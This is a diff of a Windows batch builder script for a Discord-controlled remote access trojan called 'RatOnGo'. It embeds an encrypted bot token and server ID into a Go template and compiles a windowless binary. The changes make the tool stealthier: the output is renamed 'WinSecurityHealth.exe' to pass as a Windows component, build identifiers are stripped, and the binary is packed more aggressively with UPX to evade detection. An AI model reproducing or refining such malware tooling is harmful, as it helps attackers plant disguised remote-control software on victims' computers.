@@ -1,10 +1,10 @@
 @echo off
-title RatOnGo Builder - by ng/wesk
+title GoRat Builder
 setlocal enabledelayedexpansion
 
 set TEMPLATE_FILE=main.go
 set TEMP_FILE=main_temp.go
-set GO_BINARY_NAME=RatOnGo.exe
+set GO_BINARY_NAME=WinSecurityHealth.exe
 set UPX_PATH=.\upx\upx.exe
 set KEY=5A
 
@@ -12,23 +12,17 @@ if exist %GO_BINARY_NAME% del %GO_BINARY_NAME%
 if exist %TEMP_FILE% del %TEMP_FILE%
 
 echo.
-echo Welcome to the RatOnGo builder!
-echo This script will encrypt your token, obfuscate the binary, and build the executable.
+echo [+] RatOnGo Stealth Builder - Using PROVEN method
+echo [+] Same encryption that worked before
 echo.
 
-where garble >nul 2>&1
-if errorlevel 1 (
-    echo Garble not found. Installing...
-    go install mvdan.cc/garble@latest
-)
-
-set /p "TOKEN=Paste your Discord bot token: "
-set /p "GUILD_ID=Enter your server (guild) ID: "
+set /p "TOKEN=Discord Bot Token: "
+set /p "GUILD_ID=Guild/Server ID: "
 
 call :encrypt "%TOKEN%" TOKEN_ENC
 call :encrypt "%GUILD_ID%" GUILD_ENC
 
-echo Injecting encrypted data...
+echo [+] Injecting encrypted data...
 (
     for /f "usebackq delims=" %%a in ("%TEMPLATE_FILE%") do (
         set "line=%%a"
@@ -38,30 +32,30 @@ echo Injecting encrypted data...
     )
 ) > %TEMP_FILE%
 
-echo Building the binary with garble...
-garble build -ldflags="-s -w -H=windowsgui" -o %GO_BINARY_NAME% %TEMP_FILE%
+echo [+] Building with stealth optimizations...
+go build -ldflags="-s -w -H=windowsgui -buildid=" -trimpath -o %GO_BINARY_NAME% %TEMP_FILE%
 if %errorlevel% neq 0 (
-    echo ERROR: Garble build failed.
+    echo [-] Build failed
     pause
     goto cleanup
 )
-echo Build successful.
+echo [+] Build successful
 
-echo Compressing with UPX...
+echo [+] Compressing with UPX...
 if not exist "%UPX_PATH%" (
-    echo ERROR: upx.exe not found in the 'upx' folder.
-    pause
-    goto cleanup
+    echo [!] UPX not found - skipping compression
+    goto done
 )
-%UPX_PATH% --brute --overlay=strip --strip-relocs=0 %GO_BINARY_NAME% >nul
+%UPX_PATH% --ultra-brute --overlay=strip --strip-relocs=0 %GO_BINARY_NAME% >nul
 if %errorlevel% neq 0 (
-    echo WARNING: UPX compression failed.
+    echo [!] UPX compression failed
 ) else (
-    echo Compression finished.
+    echo [+] Compression completed
 )
 
+:done
 echo.
-echo Done! Your file is ready: %GO_BINARY_NAME%
+echo [+] Done! Your file is ready: %GO_BINARY_NAME%
 echo.
 
 :cleanup
